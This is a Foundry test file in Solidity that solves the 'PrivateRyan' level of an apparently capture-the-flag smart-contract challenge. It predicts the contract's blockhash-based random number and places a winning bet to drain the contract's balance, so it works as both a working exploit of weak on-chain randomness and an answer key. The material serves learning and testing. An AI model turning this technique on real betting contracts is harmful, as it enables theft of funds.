// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/02_PrivateRyan/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    uint256 constant private FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;
    uint256 constant private BLOCK_NUMBER = 48743985;
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.roll(BLOCK_NUMBER);
    }

    function rand(uint256 blockNum, uint256 seed, uint256 max) internal returns (uint256) {
        // We need to rool new block because of blockhash function which depends on block.number
        // We also could chanded setUp function and move vm.roll(BLOCK_NUMBER) to one line up, and then we won't need to roll here
        vm.roll(blockNum);
        uint256 factor = (FACTOR * 100) / max;
        uint256 blockNumber = block.number - seed;
        uint256 hashVal = uint256(blockhash(blockNumber));

        return uint256((uint256(hashVal) / factor)) % max;
    }

    function testExploitLevel() public {
        // Calculate initial seed, contract was created at 1st block
        uint256 seed = rand(1, 1, 256);

        // Calculate number using new block number and calculated seed
        uint256 predictedNum = rand(BLOCK_NUMBER, seed, 100);

         // Attack the contract by placing a bet on the predicted number
        instance.spin{value: 0.01 ether}(predictedNum);

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
